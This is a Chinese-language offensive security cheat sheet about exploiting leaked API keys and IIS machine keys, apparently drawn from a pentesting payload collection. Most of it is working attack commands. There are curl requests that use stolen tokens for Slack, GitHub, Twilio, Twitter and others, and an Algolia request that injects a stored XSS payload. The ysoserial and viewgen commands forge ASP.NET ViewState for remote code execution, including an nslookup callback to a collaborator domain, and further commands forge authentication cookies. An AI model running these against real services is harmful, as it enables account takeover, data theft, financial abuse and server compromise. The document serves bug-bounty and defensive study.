# API 密钥泄露

> API 密钥是用于验证与系统相关的请求的唯一标识符。一些开发人员可能会将其硬编码或留在公共文件中。

## 目录

- [Tools](#tools)
- [Exploit](#exploit)
    - [Google Maps](#google-maps)
    - [Algolia](#algolia)
    - [Slack API Token](#slack-api-token)
    - [Facebook Access Token](#facebook-access-token)
    - [Github client id and client secret](#github-client-id-and-client-secret)
    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
    - [Twitter API Secret](#twitter-api-secret)
    - [Twitter Bearer Token](#twitter-bearer-token)
    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
    - [HockeyApp API Token](#hockeyapp-api-token)
    - [IIS Machine Keys](#iis-machine-keys)
    - [Mapbox API Token](#Mapbox-API-Token)


## 工具

- [streaak/keyhacks](https://github.com/streaak/keyhacks) - 是一个存储库，其中显示了可以快速检查国外漏洞赏金计划泄露的 API 密钥是否有效。
- [Hae](https://github.com/gh0stkey/HaE) - BURP插件，用于正则匹配请求内容是否包含特定敏感信息，非常有用。

## Exploit

以下命令可以使用泄露的令牌接管账户或从API中提取个人信息。

* ### Google Maps

  使用：https://github.com/ozguralp/gmapsapiscanner/

  用法：

  | 名称           | 端点                                                         |
  | -------------- | ------------------------------------------------------------ |
  | 静态地图       | https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE |
  | 街景视图       | https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
  | 嵌入地图       | https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE |
  | 路线           | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE |
  | 地理编码       | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
  | 距离矩阵       | [https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE](https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626&key=KEY_HERE) |
  | 从文本查找地点 | [https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum of Contemporary Art Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE) |
  | 自动完成       | [https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=(cities)&key=KEY_HERE) |
  | 高程           | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE |
  | 时区           | https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE |
  | 道路           | https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795 |
  | 地理定位       | https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |

  影响：

  - 消耗公司的月度配额或通过未经授权使用该服务导致公司超额付费，对公司造成经济损失
  - 如果Google账户中存在最大账单控制设置的限制，可以对特定服务进行拒绝服务攻击

### Algolia 

```powershell
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```

### Slack API Token

```powershell
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
```

### Facebook Access Token

```powershell
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
```

### Github client id and client secret

```powershell
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
```

### Twilio Account_sid and Auth token

```powershell
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
```

### Twitter API Secret

```powershell
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

### Twitter Bearer Token

```powershell
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
```

### Gitlab Personal Access Token

```powershell
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
```


### HockeyApp API Token

```powershell
curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
```


### IIS Machine Keys泄露可导致RCE

> 该密钥用于加密和解密表单身份验证的cookie数据和视图状态数据，以及验证进程外会话状态标识。

需要满足以下条件
* machineKey 的 **validationKey** 和 **decryptionKey**
* __VIEWSTATEGENERATOR cookies__
* VIEWSTATE cookies

例子 https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

启用 **AutoGenerate** 时，**web.config** / **machine.config**的文件位置
* 32-bit
    * C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
    * C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
* 64-bit
    * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
    * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
* 当启用 **AutoGenerate** 时在注册表中的位置（可通过 [这个工具](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) 提取 https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab）
    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey


#### 识别已知的machine key

* Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
* Exploit with [ViewGen](https://github.com/0xacb/viewgen)

```powershell
# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

# --encrypteddata : __VIEWSTATE parameter value of the target application
# --modifier : __VIEWSTATEGENERATOR parameter value
$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
```

#### 解码 ViewState

```powershell
$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="

$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode

$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
```


#### 生成用于远程代码执行的 ViewState

**注意**：使用生成的 ViewState 发送 POST 请求到相同的端点，在 Burp 中你应该对你的有效payload进行 **URL 编码关键字符**。

```powershell
$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"

$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
```


#### 使用machine key编辑cookies

如果你有 machineKey 但 viewstate 被禁用。

ASP.net 表单身份验证 Cookies : https://github.com/liquidsec/aspnetCryptTools

```powershell
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```



## 参考链接

* [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
* [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
* [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
* [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)
